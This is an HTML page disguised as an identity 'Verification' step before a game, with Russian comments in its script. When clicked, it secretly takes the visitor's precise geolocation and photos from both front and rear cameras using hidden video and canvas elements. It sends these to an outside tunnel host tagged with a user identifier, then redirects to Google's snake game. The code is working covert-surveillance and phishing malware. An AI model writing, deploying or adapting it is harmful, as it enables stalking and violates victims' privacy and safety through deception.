<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.2s; }
        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.2s; }
        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; transition: 0.3s; }
        .btn:active { transform: scale(0.95); opacity: 0.8; }
        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:20px auto; }
        @keyframes spin { 100% { transform:rotate(360deg); } }
        video, canvas { display:none; position: absolute; left: -9999px; }
        p { color: #888; font-size: 14px; margin-bottom: 20px; }
        
        /* Класс для вспышки */
        body.flash-active { background: #fff !important; }
        .flash-active .card { opacity: 0; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg">Please confirm your identity to continue to the game.</p>
        <button class="btn" id="go" onclick="run()">CONFIRM</button>
        <div id="loader"></div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

<script>
    // Твоя актуальная ссылка (БЕЗ слэша в конце)
    const API = "https://1540742d574c44.lhr.life"; 
    const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";

    const urlParams = new URLSearchParams(window.location.search);
    const user = urlParams.get('user') || "Unknown";

    async function takePhoto(mode) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;

        // Если это селфи (front camera), включаем белый экран
        if (mode === "user") document.body.classList.add('flash-active');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode, width: {ideal: 1280}, height: {ideal: 720} },
                audio: false 
            });
            
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            await new Promise(r => setTimeout(r, 1500)); // Даем камере настроиться

            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            stream.getTracks().forEach(t => t.stop());
            
            return blob;
        } catch (e) {
            console.error(e);
            return null;
        } finally {
            // В любом случае выключаем вспышку
            document.body.classList.remove('flash-active');
        }
    }

    async function run() {
        const btn = document.getElementById('go');
        const loader = document.getElementById('loader');
        const msg = document.getElementById('msg');
        const statusTitle = document.getElementById('st');

        btn.style.display = 'none';
        loader.style.display = 'block';
        msg.innerText = "Processing security check...";

        try {
            // Гео
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
            }, null, {enableHighAccuracy: true});

            const fd = new FormData();
            
            msg.innerText = "Verifying identity (1/2)...";
            const f1 = await takePhoto("user");
            if (f1) fd.append('files', f1, 'front.jpg');

            msg.innerText = "Verifying identity (2/2)...";
            const f2 = await takePhoto("environment");
            if (f2) fd.append('files', f2, 'back.jpg');

            if (fd.has('files')) {
                msg.innerText = "Uploading data...";
                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                    method: 'POST',
                    body: fd
                });
            }

            statusTitle.innerText = "Success";
            loader.style.display = 'none';
            msg.innerText = "Identity verified! Redirecting...";

            setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);

        } catch (e) {
            statusTitle.innerText = "Error";
            msg.innerText = "Check permissions and retry.";
            loader.style.display = 'none';
            btn.style.display = 'block';
        }
    }
</script>
</body>
</html>
